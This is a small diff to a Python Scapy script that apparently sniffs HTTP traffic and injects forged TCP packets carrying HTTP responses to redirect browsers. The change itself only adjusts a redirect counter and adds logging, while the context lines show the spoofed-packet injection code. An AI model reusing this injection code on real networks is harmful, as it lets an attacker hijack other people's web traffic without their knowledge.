@@ -49,8 +49,9 @@ def inject_back_url(pkt, newtarget):
     response = Ether(dst=ethsrc, src=ethdst)/IP(src=dst, dst=src)/TCP(flags="A",sport=dstport, dport=srcport,seq=ack,ack=newack)/httpres
     sendp(response)
     global  g_redirect_count
+    g_redirect_count = g_redirect_count + 1
     logging.info('redirect count:'+str(g_redirect_count))
-    g_redirect_count = g_redirect_count+1
+    logging.info('redirect done!!')
 
 def find_req_from_httppayload(httppayload):
 
@@ -90,6 +91,7 @@ def sniff_check_http_packet(pkt):
     print req
     gpconf.gcServer.init()
     redirect_info = gpconf.gcServer.get_direct_info(req[0], req[1])
+    print 'get_direct_info:', redirect_info
     if redirect_info is None:
         return
     logging.info('redirect '+str(req))
